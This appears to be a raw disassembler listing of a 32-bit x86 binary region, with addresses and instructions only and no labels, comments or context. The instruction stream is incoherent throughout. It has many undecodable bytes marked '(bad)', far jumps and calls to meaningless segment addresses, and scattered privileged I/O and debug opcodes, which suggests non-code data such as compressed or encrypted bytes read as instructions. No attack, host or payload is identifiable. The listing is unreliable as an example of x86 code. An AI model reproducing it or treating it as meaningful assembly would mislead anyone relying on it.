  41281d:	xchg   BYTE PTR [ecx],cl
  41281f:	jmp    0xe633:0x19d0724d
  412826:	dec    esp
  412827:	xor    al,BYTE PTR [ebp+0x74]
  41282a:	jo     0x412828
  41282c:	out    dx,eax
  41282d:	je     0x4127f8
  41282f:	jnp    0x41282e
  412831:	lods   al,BYTE PTR ds:[esi]
  412832:	add    ecx,DWORD PTR [ebx+ecx*1]
  412835:	xor    al,0x48
  412837:	cmp    al,0x83
  412839:	sbb    cl,bl
  41283b:	dec    esp
  41283c:	mov    al,BYTE PTR [edx+0x7e5a0a4d]
  412842:	jl     0x4127f4
  412844:	xor    dh,BYTE PTR [edx-0x21888aaa]
  41284a:	iret   
  41284b:	enter  0xea96,0x70
  41284f:	lock adc al,cl
  412852:	mov    WORD PTR [esi-0x1c8eb57a],ds
  412858:	ja     0x412854
  41285a:	ins    BYTE PTR es:[edi],dx
  41285b:	pop    ebx
  41285c:	mov    dl,0x26
  41285e:	nop
  41285f:	push   es
  412860:	mov    ebp,0x8ef54116
  412865:	(bad)
  412869:	cmc    
  41286a:	jbe    0x412805
  41286c:	adc    edi,DWORD PTR [esi-0x28]
  41286f:	xchg   edi,eax
  412870:	jmp    0x9e6c:0x2c9d11df
  412877:	les    esp,FWORD PTR [ebx]
  412879:	and    dl,BYTE PTR [ecx]
  41287b:	ret    0x3298
  41287e:	sub    al,0xa0
  412880:	or     esp,ebx
  412882:	retf   
  412883:	jo     0x412811
  412885:	imul   edi,DWORD PTR ds:0x623f9ee2,0xf10a83fa
  41288f:	mov    DWORD PTR [eax+0x24],0x94005a77
  412896:	fstp   QWORD PTR [esi-0x7a638f52]
  41289c:	jnp    0x412850
  41289e:	mov    ebp,0xc1b4ee3d
  4128a3:	les    edi,FWORD PTR [ebx]
  4128a5:	xchg   edi,eax
  4128a6:	aas    
  4128a7:	or     eax,0x98dc05e
  4128ac:	cmp    ebp,DWORD PTR [esi]
  4128ae:	mov    cl,0xd8
  4128b0:	mov    WORD PTR [ecx-0x58],cs
  4128b3:	xchg   ebp,eax
  4128b4:	out    0xd4,eax
  4128b6:	add    DWORD PTR [ebp-0x4a6f048a],0xe1fba018
  4128c0:	int3   
  4128c1:	test   ah,cl
  4128c3:	mov    ch,0x26
  4128c5:	cmp    BYTE PTR [edx],bl
  4128c7:	jnp    0x4128e4
  4128c9:	inc    edx
  4128ca:	jb     0x4128ab
  4128cc:	pop    ss
  4128cd:	lds    ecx,FWORD PTR [edx]
  4128cf:	retf   
  4128d0:	in     eax,dx
  4128d1:	pop    ds
  4128d2:	out    0x61,al
  4128d4:	jge    0x412862
  4128d6:	cwde   
  4128d7:	cli    
  4128d8:	push   ss
  4128d9:	mov    BYTE PTR [ebx+0x68],dl
  4128dc:	jl     0x412867
  4128de:	dec    ebx
  4128df:	stc    
  4128e0:	cwde   
  4128e1:	xchg   ecx,eax
  4128e2:	xor    al,0x88
  4128e4:	sub    BYTE PTR [eax+0xbb37107],0x4e
  4128eb:	add    eax,0x9133df52
  4128f0:	in     al,0x12
  4128f2:	cmp    edi,DWORD PTR [ecx]
  4128f4:	call   0x6e1e:0x93138129
  4128fb:	out    0xa0,eax
  4128fd:	inc    esi
  4128fe:	push   edx
  4128ff:	lahf   
  412900:	mov    edi,0xff5190a9
  412905:	add    BYTE PTR [edx-0x5c],dl
  412908:	inc    edi
  412909:	inc    eax
  41290a:	and    BYTE PTR [edx],cl
  41290c:	cmp    ah,BYTE PTR [ecx+0x5f84643f]
  412912:	enter  0x2054,0x38
  412916:	jp     0x41294e
  412918:	cwde   
  412919:	pop    ecx
  41291a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41291b:	rol    DWORD PTR [esi],cl
  41291d:	and    ebx,DWORD PTR [edx+0xaf7f0ed]
  412923:	sar    BYTE PTR [eax-0x9],0x5
  412927:	push   ss
  412928:	add    edx,DWORD PTR [edi]
  41292a:	sahf   
  41292b:	vmovhpd xmm6,xmm6,QWORD PTR [eax]
  41292f:	add    al,0xb7
  412931:	and    BYTE PTR [edi],al
  412933:	je     0x412960
  412935:	or     esi,DWORD PTR [edx-0x3d]
  412938:	adc    BYTE PTR [edi-0x5a],bl
  41293b:	outs   dx,BYTE PTR ds:[esi]
  41293c:	call   0x9d77:0x42032938
  412943:	int    0x1e
  412945:	iret   
  412946:	cmp    al,0x22
  412948:	sbb    dh,BYTE PTR [ecx]
  41294a:	(bad)  
  41294b:	jg     0x412979
  41294d:	adc    al,0x22
  41294f:	adc    eax,0x9185b400
  412954:	nop
  412955:	dec    esi
  412956:	popa   
  412957:	mov    edx,0xd352085f
  41295c:	jb     0x412974
  41295e:	sbb    eax,edi
  412960:	inc    ebp
  412961:	js     0x412954
  412963:	in     al,dx
  412964:	and    BYTE PTR [ecx-0x7b],dl
  412967:	fst    DWORD PTR ds:0xd5a3d077
  41296d:	fld    st(5)
  41296f:	cs ret 0x9b29
  412973:	mov    bh,0x6
  412975:	je     0x41292f
  412977:	neg    DWORD PTR [esi+0x7c]
  41297a:	adc    ecx,ebp
  41297c:	jmp    0x4129dc
  41297e:	fs stc 
  412980:	sub    bl,ch
  412982:	jp     0x412905
  412984:	mov    ecx,0x1c382ffb
  412989:	cmp    BYTE PTR [ecx+0x1af26e61],al
  41298f:	push   ds
  412990:	mov    ah,0xbc
  412992:	lods   al,BYTE PTR ds:[esi]
  412993:	in     eax,0x68
  412995:	repz push ds
  412997:	adc    ebx,DWORD PTR [edi]
  412999:	test   ah,0xa7
  41299c:	enter  0x3c3,0x78
  4129a0:	mov    ds:0x6cbad440,eax
  4129a5:	push   edx
  4129a6:	ja     0x4129bc
  4129a8:	mov    bh,0x57
  4129aa:	in     eax,0xcb
  4129ac:	adc    dl,BYTE PTR [edi+0x5d]
  4129af:	icebp  
  4129b0:	mov    ah,0x9e
  4129b2:	push   edx
  4129b3:	sbb    BYTE PTR [esi-0x73],bh
  4129b6:	or     ecx,0xfffffff5
  4129b9:	and    eax,0xc5c935ea
  4129be:	aaa    
  4129bf:	adc    eax,0x1cb8c01d
  4129c4:	jmp    0x4776:0x2e06f9b9
  4129cb:	in     eax,dx
  4129cc:	retf   
  4129cd:	jmp    0x9389516c
  4129d2:	std    
  4129d3:	popa   
  4129d4:	adc    DWORD PTR [edi+ebp*8+0x26],edi
  4129d8:	or     BYTE PTR [edi-0x12],dh
  4129db:	into   
  4129dc:	dec    ebx
  4129dd:	pusha  
  4129de:	cli    
  4129df:	pushf  
  4129e0:	jmp    0xeca0:0x7a071079
  4129e7:	cmp    BYTE PTR [ebx+0x4ab8250b],cl
  4129ed:	add    DWORD PTR [esi+edi*2-0x1b],ebx
  4129f1:	pusha  
  4129f2:	push   es
  4129f3:	(bad)  
  4129f4:	or     al,0x85
  4129f6:	jge    0x412a30
  4129f8:	mov    esi,0xafec6773
  4129fd:	shr    DWORD PTR [ebp+0x20],1
  412a00:	cmp    DWORD PTR [ebx],0xb3d800b2
  412a06:	jmp    0x79d3:0x51b5f37e
  412a0d:	cmp    DWORD PTR [ecx-0xd17f76],0x299b0550
  412a17:	lahf   
  412a18:	sar    esi,cl
  412a1a:	fidiv  WORD PTR [ebp+eax*8-0x7e5cc09d]
  412a21:	sti    
  412a22:	push   ebx
  412a23:	mov    edx,0xf0aa6e0
  412a28:	and    bh,BYTE PTR [eax+0x69f17db1]
  412a2e:	push   ds
  412a2f:	fimul  DWORD PTR [ecx+eiz*8]
  412a32:	arpl   WORD PTR [ecx+edx*2],di
  412a35:	and    al,0xd7
  412a37:	push   es
  412a38:	adc    dh,BYTE PTR [ebx-0x347f394]
  412a3e:	test   eax,0x908a6419
  412a43:	adc    al,BYTE PTR [eax-0xe]
  412a46:	jns    0x412aa8
  412a48:	mov    cl,0x2d
  412a4a:	int    0xef
  412a4c:	and    eax,DWORD PTR [eax+0xc4cd1c0]
  412a52:	fld    TBYTE PTR [edi-0x55]
  412a55:	sar    BYTE PTR [edi+ebx*8-0x3c],1
  412a59:	arpl   sp,bp
  412a5b:	sub    DWORD PTR [edi+edi*1+0x25],ecx
  412a5f:	icebp  
  412a60:	out    0x6e,eax
  412a62:	push   0x8018e2d3
  412a67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a68:	xchg   edx,eax
  412a69:	jo     0x412a3d
  412a6b:	retf   
  412a6c:	push   edi
  412a6d:	mov    al,ds:0x256c442f
  412a72:	adc    BYTE PTR [ebx],ch
  412a74:	cmp    BYTE PTR [ebx],0xae
  412a77:	test   BYTE PTR [edx+0x40],dh
  412a7a:	xchg   WORD PTR [ecx-0x22],ax
  412a7e:	repnz pop esi
  412a80:	add    BYTE PTR [ebx],dh
  412a82:	mov    ch,BYTE PTR [edx-0x35]
  412a85:	les    esi,FWORD PTR [ebp+0x3f2fc669]
  412a8b:	jmp    0x420f:0x48d6fd6d
  412a92:	pop    ds
  412a93:	fsub   DWORD PTR ds:0x88089654
  412a99:	cmp    eax,0x24cb8cfd
  412a9e:	(bad)  
  412aa0:	inc    esp
  412aa1:	mov    BYTE PTR [ecx+0x60],cl
  412aa4:	pushf  
  412aa5:	sbb    esi,DWORD PTR [edi]
  412aa7:	push   es
  412aa8:	es out dx,al
  412aaa:	(bad)  
  412aab:	mov    ebx,0x8f685575
  412ab0:	fdivr  DWORD PTR [ebx+edx*4+0x20c4c7b2]
  412ab7:	lahf   
  412ab8:	adc    eax,0x837fd909
  412abd:	lds    esi,FWORD PTR [ecx-0xbd057ad]
  412ac3:	jmp    0x8026eea0
  412ac8:	jp     0x412a82
  412aca:	mov    dh,0x76
  412acc:	lahf   
  412acd:	mov    ds:0xf33aa756,eax
  412ad2:	out    0x3b,eax
  412ad4:	repz or eax,0xfa5faa6f
  412ada:	cmp    al,0x98
  412adc:	and    BYTE PTR [ecx+0x42],ah
  412adf:	pop    esp
  412ae0:	inc    edi
  412ae1:	jno    0x412aa6
  412ae3:	push   edi
  412ae4:	aas    
  412ae5:	inc    ecx
  412ae6:	iret   
  412ae7:	push   ecx
  412ae8:	jle    0x412a6c
  412aea:	cs in  eax,0x26
  412aed:	mov    ds:0x8eaa9263,al
  412af2:	in     al,0xe2
  412af4:	jecxz  0x412abc
  412af6:	int3   
  412af7:	getsec 
  412af9:	loopne 0x412b4f
  412afb:	mov    eax,0x16215003
  412b00:	lea    edx,[edi-0x39]
  412b03:	mov    edi,0x8b9fb7e6
  412b08:	pushf  
  412b09:	(bad)  
  412b0a:	xchg   edx,eax
  412b0b:	and    esp,DWORD PTR [ebp-0x4]
  412b0e:	or     DWORD PTR [ecx-0x74692170],ebp
  412b14:	add    BYTE PTR [esp+ebx*2+0x39bc0c85],ah
  412b1b:	xchg   ecx,eax
  412b1c:	jecxz  0x412b0f
  412b1e:	pop    esi
  412b1f:	push   es
  412b20:	jmp    0xb46d:0x214df9cd
  412b27:	(bad)  
  412b29:	sub    al,0x93
  412b2b:	fld    DWORD PTR [eax+0x7d]
  412b2e:	mov    dh,0x52
  412b30:	arpl   WORD PTR [ebp-0x6fdd8765],cx
  412b36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b37:	sub    BYTE PTR [eax+0x231aa8a6],ch
  412b3d:	outs   dx,DWORD PTR ds:[esi]
  412b3e:	loopne 0x412b9f
  412b40:	(bad)  
  412b41:	mov    al,ds:0xa3e930bf
  412b46:	xchg   BYTE PTR [esi-0x4a],ch
  412b49:	fs dec edx
  412b4b:	adc    ah,BYTE PTR [esi]
  412b4d:	test   bl,bl
  412b4f:	imul   edi,ebx,0xd99e3798
  412b55:	adc    eax,0xd26eff95
  412b5a:	jmp    0x412ae8
  412b5c:	into   
  412b5d:	imul   edi,DWORD PTR [edi],0xffffff80
  412b60:	push   ecx
  412b61:	lahf   
  412b62:	or     eax,0xbe1d2e35
  412b67:	add    eax,DWORD PTR [edx+0x74b8a77b]
  412b6d:	cwde   
  412b6e:	out    0xa0,al
  412b70:	mov    ds:0x7ed02f66,al
  412b75:	stos   DWORD PTR es:[edi],eax
  412b76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b77:	sar    DWORD PTR [esi],1
  412b79:	jg     0x412b0f
  412b7b:	popa   
  412b7c:	mov    cs,WORD PTR [ebx-0x795707ef]
  412b82:	xchg   edx,eax
  412b83:	xchg   edx,eax
  412b84:	lods   al,BYTE PTR ds:[esi]
  412b85:	dec    eax
  412b86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b87:	rol    DWORD PTR [esi],1
  412b89:	sub    ebx,DWORD PTR [esp+edi*2+0xf35a754]
  412b90:	mul    esp
  412b92:	mov    BYTE PTR [ecx+0x30c18cda],dl
  412b98:	and    BYTE PTR [esp+ebp*8],0x21
  412b9c:	retf   0xbb5f
  412b9f:	cmp    BYTE PTR [ecx+0x48],cl
  412ba2:	jle    0x412b42
  412ba4:	es and al,0x67
  412ba7:	outs   dx,DWORD PTR ds:[esi]
  412ba8:	lock xor bh,BYTE PTR [edi-0x11]
  412bac:	or     al,0xbf
  412bae:	jmp    0x680e:0x480571e0
  412bb5:	div    eax
  412bb7:	push   ebx
  412bb8:	sahf   
  412bb9:	(bad)  
  412bba:	cmp    bh,dh
  412bbc:	mov    WORD PTR [edx-0x5856ed89],ds
  412bc2:	or     BYTE PTR [edi],ch
  412bc4:	cmp    al,BYTE PTR [esi-0x1cf0f50f]
  412bca:	jne    0x412b5b
  412bcc:	mov    ds:0x4745091b,eax
  412bd1:	inc    ebp
  412bd2:	add    BYTE PTR [esi],cl
  412bd4:	adc    al,0x1f
  412bd6:	pop    esi
  412bd7:	ja     0x412b95
  412bd9:	lahf   
  412bda:	adc    edi,DWORD PTR [ecx+0x6cde54a9]
  412be0:	outs   dx,BYTE PTR ds:[esi]
  412be1:	and    ebx,DWORD PTR [ecx-0x4004b9e5]
  412be7:	ja     0x412b8a
  412be9:	xor    ebx,esp
  412beb:	scas   al,BYTE PTR es:[edi]
  412bec:	jnp    0x412b6f
  412bee:	(bad)  
  412bef:	jae    0x412bfe
  412bf1:	sbb    al,0x7a
  412bf3:	fldcw  WORD PTR [eax-0x76]
  412bf6:	in     eax,dx
  412bf7:	push   edi
  412bf8:	push   ebx
  412bf9:	inc    ebp
  412bfa:	out    0x7c,eax
  412bfc:	jbe    0x412c5f
  412bfe:	bound  esp,QWORD PTR [esi-0x50e748cb]
  412c04:	es ja  0x412c08
  412c07:	lods   al,BYTE PTR ds:[esi]
  412c08:	scas   eax,DWORD PTR es:[edi]
  412c09:	loope  0x412bd3
  412c0b:	mov    esi,esp
  412c0d:	mul    DWORD PTR [ebp-0x36c59018]
  412c13:	les    edi,FWORD PTR [ebp+0x989e756]
  412c19:	loopne 0x412bfe
  412c1b:	or     eax,0xb956204b
  412c20:	mov    al,ds:0xfa953d30
  412c25:	nop
  412c26:	mov    ecx,0x52571eaa
  412c2b:	push   ebp
  412c2c:	lods   eax,DWORD PTR ds:[esi]
  412c2d:	push   esi
  412c2e:	iret   
  412c2f:	mov    ecx,0xcb7d172
  412c34:	push   esi
  412c35:	test   DWORD PTR [eax],edi
  412c37:	mov    al,0xc5
  412c39:	xchg   ah,dh
  412c3b:	rcl    BYTE PTR [ebp+0x7c5915e3],0xc1
  412c42:	test   DWORD PTR [edx+0x7e],esi
  412c45:	fucomp st(1)
  412c47:	lds    edi,FWORD PTR [ecx-0x76]
  412c4a:	push   ebp
  412c4b:	fsubr  st(2),st
  412c4d:	sbb    ch,ah
  412c4f:	std    
  412c50:	iret   
  412c51:	retf   
  412c52:	ror    BYTE PTR [esi+0x69],1
  412c55:	mov    ebx,ebx
  412c57:	jmp    0x412c25
  412c59:	(bad)  
  412c5a:	ins    BYTE PTR es:[edi],dx
  412c5b:	test   eax,0x2dcf539b
  412c60:	stos   DWORD PTR es:[edi],eax
  412c61:	jmp    0x412c7c
  412c63:	inc    DWORD PTR ds:0xb63e1574
  412c69:	sub    al,0xd1
  412c6b:	cmp    esp,DWORD PTR [edx]
  412c6d:	lods   al,BYTE PTR ds:[esi]
  412c6e:	(bad)  
  412c6f:	fwait
  412c70:	mov    edx,0x958bd5cd
  412c75:	jl     0x412cb2
  412c77:	adc    al,0x7b
  412c79:	mov    cl,BYTE PTR [ecx+0x4f]
  412c7c:	and    ebp,DWORD PTR [edi]
  412c7e:	int    0xc0
  412c80:	mov    ?,WORD PTR [edx]
  412c82:	jl     0x412cb7
  412c84:	mov    dh,0x58
  412c86:	add    DWORD PTR [esi],ebp
  412c88:	push   0xffffff93
  412c8a:	mov    ds:0x164b4684,eax
  412c8f:	jp     0x412d00
  412c91:	and    al,0x77
  412c93:	dec    edi
  412c94:	cwde   
  412c95:	inc    ebx
  412c96:	test   eax,0x6cc024ef
  412c9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c9c:	cmp    DWORD PTR [edi+0x41],edx
  412c9f:	dec    ebx
  412ca0:	pushf  
  412ca1:	fstp   DWORD PTR [ebx]
  412ca3:	mov    esp,0x9dfd2bba
  412ca8:	iret   
  412ca9:	test   BYTE PTR [ebx-0x74a5e3d7],0xec
  412cb0:	pusha  
  412cb1:	in     al,0xb2
  412cb3:	arpl   dx,si
  412cb5:	ins    DWORD PTR es:[edi],dx
  412cb6:	dec    BYTE PTR [edi+0x5629ab31]
  412cbc:	sub    eax,DWORD PTR [edx]
  412cbe:	xchg   BYTE PTR [edx-0x6d],al
  412cc1:	test   al,0x2b
  412cc3:	je     0x412ca9
  412cc5:	jmp    DWORD PTR [esi]
  412cc7:	aam    0xaa
  412cc9:	or     DWORD PTR [edx+0x4e],ecx
  412ccc:	dec    ebx
  412ccd:	jl     0x412d17
  412ccf:	push   ebp
  412cd0:	mov    bl,0x15
  412cd2:	xor    bh,cl
  412cd4:	push   es
  412cd5:	stc    
  412cd6:	fld    DWORD PTR [ecx+0x46]
  412cd9:	loop   0x412d00
  412cdb:	jbe    0x412c9e
  412cdd:	nop
  412cde:	adc    al,0x2f
  412ce0:	scas   al,BYTE PTR es:[edi]
  412ce1:	cdq    
  412ce2:	push   esi
  412ce3:	inc    edi
  412ce4:	int3   
  412ce5:	fcom   DWORD PTR [ebx]
  412ce7:	pop    ecx
  412ce8:	outs   dx,BYTE PTR ds:[esi]
  412ce9:	imul   edx,DWORD PTR [edi],0x207bfc5
  412cef:	jp     0x412d6e
  412cf1:	xchg   bh,cl
  412cf3:	mov    ds:0xf11a6145,al
  412cf8:	les    ecx,FWORD PTR [esi+0x149202a]
  412cfe:	pop    ebx
  412cff:	int    0x2
  412d01:	loop   0x412d62
  412d03:	sub    esi,DWORD PTR [ebp-0x6]
  412d06:	ins    BYTE PTR es:[edi],dx
  412d07:	call   0x70a8f21c
  412d0c:	xor    al,0x28
  412d0e:	retf   
  412d0f:	imul   ebp,edx,0xfffffff3
  412d12:	jae    0x412d0c
  412d14:	popw   es
  412d16:	outs   dx,BYTE PTR ds:[esi]
  412d17:	add    al,0xf6
  412d19:	pop    ebx
  412d1a:	test   ah,al
  412d1c:	add    ebx,DWORD PTR [edx+0x4f]
  412d1f:	shr    DWORD PTR [ebx],1
  412d21:	mov    ebx,0x1dd40ce6
  412d26:	shr    BYTE PTR [edx-0x6c],1
  412d29:	xchg   ecx,eax
  412d2a:	add    cl,BYTE PTR [eax-0x4c1277ac]
  412d30:	jg     0x412d0e
  412d32:	and    BYTE PTR [edi],dl
  412d34:	mov    dl,0xa0
  412d36:	adc    eax,0xb18c37b4
  412d3b:	inc    eax
  412d3c:	push   ss
  412d3d:	dec    edx
  412d3e:	bnd jns 0x412d1e
  412d41:	jmp    0x412d2e
  412d43:	mov    gs,WORD PTR [edi]
  412d45:	ret    
  412d46:	fdiv   DWORD PTR [edi+0x12]
  412d49:	jmp    0x412d87
  412d4b:	inc    esp
  412d4c:	mov    edx,0xa8e28f22
  412d51:	pushf  
  412d52:	(bad)  
  412d53:	out    dx,al
  412d54:	sar    BYTE PTR [edi],1
  412d56:	xchg   esi,eax
  412d57:	repz out dx,al
  412d59:	fidivr WORD PTR [edx-0x68c4ead8]
  412d5f:	out    dx,eax
  412d60:	and    BYTE PTR [eax+eax*4+0x36],bl
  412d64:	sbb    DWORD PTR [eax-0x50461343],ecx
  412d6a:	push   ebx
  412d6b:	pop    ss
  412d6c:	nop
  412d6d:	and    BYTE PTR [ecx],dh
  412d6f:	cmp    al,0xa0
  412d71:	jb     0x412d40
  412d73:	jmp    0xd4336ede
  412d78:	and    edx,DWORD PTR [eax+eiz*4+0x48]
  412d7c:	push   ebx
  412d7d:	aad    0xde
  412d7f:	mov    BYTE PTR [eax],bl
  412d81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d82:	lods   eax,DWORD PTR ds:[esi]
  412d83:	mov    bl,0x7c
  412d85:	out    0xad,al
  412d87:	in     al,dx
  412d88:	stos   DWORD PTR es:[edi],eax
  412d89:	jmp    0x3abb8aac
  412d8e:	outs   dx,DWORD PTR ds:[esi]
  412d8f:	mul    DWORD PTR [ebp-0xe]
  412d92:	scas   al,BYTE PTR es:[edi]
  412d93:	fild   QWORD PTR [ecx+0x7a]
  412d96:	inc    eax
  412d97:	cmp    eax,0xbb299d3a
  412d9c:	adc    DWORD PTR [ecx-0x80],esi
  412d9f:	cmc    
  412da0:	push   esi
  412da1:	ins    DWORD PTR es:[edi],dx
  412da2:	inc    esi
  412da3:	sti    
  412da4:	shl    al,0xbb
  412da7:	idiv   DWORD PTR [ebp-0x5c]
  412daa:	adc    DWORD PTR [esi],ebp
  412dac:	fsub   DWORD PTR [ebx-0x13550843]
  412db2:	push   ebp
  412db3:	cli    
  412db4:	jp     0x412e32
  412db6:	out    dx,al
  412db7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412db8:	out    0x25,al
  412dba:	add    eax,0x15f5dcdf
  412dbf:	imul   ecx,DWORD PTR [ecx-0x4a],0xffffffa4
  412dc3:	stos   DWORD PTR es:[edi],eax
  412dc4:	xchg   esi,eax
  412dc5:	adc    BYTE PTR [ebp-0x4d],0x1
  412dc9:	stc    
  412dca:	xor    BYTE PTR [edx],bl
  412dcc:	icebp  
  412dcd:	add    BYTE PTR ds:0x6fc303ea,dh
  412dd3:	cmp    DWORD PTR [ecx],0x2dcd2049
  412dd9:	cmp    ch,BYTE PTR [ecx+ebp*8]
  412ddc:	inc    ecx
  412ddd:	(bad)  
  412dde:	pusha  
  412ddf:	fistp  QWORD PTR [eax]
  412de1:	loop   0x412e3c
  412de3:	and    esp,DWORD PTR [ebp-0x31a70f56]
  412de9:	mov    ebp,esp
  412deb:	lahf   
  412dec:	xchg   ebx,eax
  412ded:	out    dx,al
  412dee:	cld    
  412def:	test   BYTE PTR [ebx-0x1bb87f21],bl
  412df5:	mov    ss,WORD PTR [esi-0x8]
  412df8:	add    eax,0x4c060c2d
  412dfd:	mov    bh,0xa8
  412dff:	shr    BYTE PTR [eax+0x9de5e47],cl
  412e05:	mov    eax,0x2d33b37a
  412e0a:	adc    al,dh
  412e0c:	inc    DWORD PTR [edx]
  412e0e:	lds    ebp,FWORD PTR [esp+edx*2+0x68]
  412e12:	inc    edx
  412e13:	xchg   esi,eax
  412e14:	push   ebp
  412e15:	inc    ebx
  412e16:	(bad)  [ebx+eiz*2+0x51]
  412e1a:	fist   WORD PTR [eax+ecx*4-0x67cd3b62]
  412e21:	scas   eax,DWORD PTR es:[edi]
  412e22:	rol    eax,0xca
  412e25:	lock dec esi
  412e27:	mov    esp,0x897ad821
  412e2c:	jae    0x412dc1
  412e2e:	xor    al,0x4c
  412e30:	les    ebx,FWORD PTR [ebx]
  412e32:	daa    
  412e33:	leave  
  412e34:	pop    es
  412e35:	sbb    DWORD PTR [esi-0x20],0x52
  412e39:	push   esi
  412e3a:	sbb    al,0x27
  412e3c:	pop    edx
  412e3d:	out    0x26,eax
  412e3f:	fdiv   QWORD PTR [ecx]
  412e41:	inc    eax
  412e42:	sti    
  412e43:	(bad)  
  412e45:	mov    bl,0xc4
  412e47:	enter  0xe458,0x12
  412e4b:	in     eax,dx
  412e4c:	fist   DWORD PTR [ebx+0x5f0378f5]
  412e52:	loopne 0x412ec6
  412e54:	and    esi,DWORD PTR [esp+ebp*1]
  412e57:	fwait
  412e58:	adc    BYTE PTR [edx],0x1
  412e5b:	cmp    al,0x90
  412e5d:	dec    ebx
  412e5e:	lock imul ebx,DWORD PTR [eax],0xffffffc9
  412e62:	dec    eax
  412e63:	push   es
  412e64:	xchg   ebx,eax
  412e65:	jl     0x412e0a
  412e67:	fsubp  st(1),st
  412e69:	mov    eax,ds:0x5be41094
  412e6e:	xchg   esp,eax
  412e6f:	icebp  
  412e70:	ret    0xcad6
  412e73:	nop
  412e74:	cmp    ebp,DWORD PTR [ebx-0x3c2b6307]
  412e7a:	pop    esp
  412e7b:	xor    al,0x7f
  412e7d:	pop    ds
  412e7e:	mov    ch,0x48
  412e80:	ret    0x9a95
  412e83:	inc    esi
  412e84:	mov    ecx,0x8a2ea7d
  412e89:	(bad)  
  412e8a:	add    ebx,DWORD PTR [edx-0x18]
  412e8d:	dec    ecx
  412e8e:	pop    eax
  412e8f:	out    dx,eax
  412e90:	std    
  412e91:	add    al,0x6
  412e93:	cld    
  412e94:	lods   al,BYTE PTR ds:[esi]
  412e95:	lods   al,BYTE PTR ds:[esi]
  412e96:	test   DWORD PTR [edx+0x2d],edi
  412e99:	fmul   DWORD PTR [ecx]
  412e9b:	call   esi
  412e9d:	mov    dh,0xf5
  412e9f:	js     0x412ebb
  412ea1:	fcmovbe st,st(6)
  412ea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ea4:	add    BYTE PTR [edi],cl
  412ea6:	push   ecx
  412ea7:	int    0x49
  412ea9:	(bad)  
  412eaa:	fnsave [ecx-0xd6a2279]
  412eb0:	mov    ch,0x2b
  412eb2:	out    0xe9,al
  412eb4:	sti    
  412eb5:	jmp    0x590d9d56
  412eba:	fldenv [esi-0x4e]
  412ebd:	clc    
  412ebe:	loope  0x412ec5
  412ec0:	inc    eax
  412ec1:	xchg   ebx,eax
  412ec2:	jp     0x412f00
  412ec4:	xor    dl,BYTE PTR [ebx+eiz*4+0x60]
  412ec8:	je     0x412e77
  412eca:	enter  0xa0e3,0x88
  412ece:	jo     0x412f19
  412ed0:	es ret 
  412ed2:	adc    BYTE PTR [ebx],bl
  412ed4:	sub    eax,0xebe710ed
  412ed9:	mov    ch,0xf4
  412edb:	lds    edi,FWORD PTR [esp+ecx*8-0x1]
  412edf:	mov    esi,0xe2fb6027
  412ee4:	daa    
  412ee5:	pop    eax
  412ee6:	jge    0x412ea0
  412ee8:	xchg   edi,eax
  412ee9:	jno    0x412e6e
  412eeb:	push   ebx
  412eec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eed:	pop    edi
  412eee:	mov    dl,0x4
  412ef0:	retf   0xa638
  412ef3:	loopne 0x412e8b
  412ef5:	ja     0x412ee5
  412ef7:	push   edx
  412ef8:	jbe    0x412f2e
  412efa:	add    al,0xca
  412efc:	retf   
  412efd:	mov    BYTE PTR [ecx+0x32],ch
  412f00:	test   DWORD PTR [esi+0x79],0x87c3c912
  412f07:	in     eax,0x37
  412f09:	fistp  DWORD PTR [esi-0x5fff4a99]
  412f0f:	inc    esi
  412f10:	cmc    
  412f11:	jle    0x412f8f
  412f13:	ficomp WORD PTR [edi+0x50]
  412f16:	pop    es
  412f17:	pop    eax
  412f18:	jnp    0x412f71
  412f1a:	(bad)  
  412f1b:	retf   0x6a66
  412f1e:	icebp  
  412f1f:	adc    BYTE PTR [ebx+0x32],bl
  412f22:	sar    DWORD PTR [edi],0xa1
  412f25:	xchg   edx,eax
  412f26:	leave  
  412f27:	mov    ch,0x6b
  412f29:	sub    al,0x7b
  412f2b:	cld    
  412f2c:	cmp    DWORD PTR [edi],esp
  412f2e:	ror    DWORD PTR [edi-0x415f6c4f],cl
  412f34:	ins    BYTE PTR es:[edi],dx
  412f35:	or     BYTE PTR [esp+ecx*2+0x13],0x51
  412f3a:	cmc    
  412f3b:	adc    ah,cl
  412f3d:	jmp    0x7ea8:0xc6f6193e
  412f44:	xchg   ebp,eax
  412f45:	test   DWORD PTR [edi-0x78],eax
  412f48:	call   0xb607:0xd7cb51d8
  412f4f:	xor    al,0xf7
  412f51:	clc    
  412f52:	lds    esp,FWORD PTR [esi+0x5d]
  412f55:	or     ecx,DWORD PTR [eax+0x1261392b]
  412f5b:	cmp    BYTE PTR [edx+esi*8+0x54056947],bl
  412f62:	dec    eax
  412f63:	out    0x42,al
  412f65:	test   DWORD PTR [eax],edi
  412f67:	xchg   edi,eax
  412f68:	stos   DWORD PTR es:[edi],eax
  412f69:	add    eax,0x22429101
  412f6e:	mov    esp,0xeda5b3d9
  412f73:	inc    esp
  412f74:	push   ebp
  412f75:	stc    
  412f76:	push   eax
  412f77:	cmp    eax,0x61363a18
  412f7c:	out    0x94,eax
  412f7e:	dec    ebp
  412f7f:	sahf   
  412f80:	(bad)  
  412f81:	mov    edx,0x65219c80
  412f86:	jl     0x412f3f
  412f88:	enter  0x1665,0x1c
  412f8c:	fist   WORD PTR [esi]
  412f8e:	mov    dh,0x55
  412f90:	outs   dx,BYTE PTR ds:[esi]
  412f91:	into   
  412f92:	out    dx,eax
  412f93:	imul   ebp,DWORD PTR [ecx+0x17],0x56
  412f97:	dec    DWORD PTR [eax+0x6b23989]
  412f9d:	inc    ebx
  412f9e:	fidiv  WORD PTR [ecx-0x2e34ee8c]
  412fa4:	cs mov esp,0x5da3a40c
  412faa:	push   ebx
  412fab:	xchg   esi,eax
  412fac:	out    0x9f,eax
  412fae:	pusha  
  412faf:	dec    esi
  412fb0:	push   0x44
  412fb2:	jg     0x412f9f
  412fb4:	sub    ch,dl
  412fb6:	mov    dl,0x79
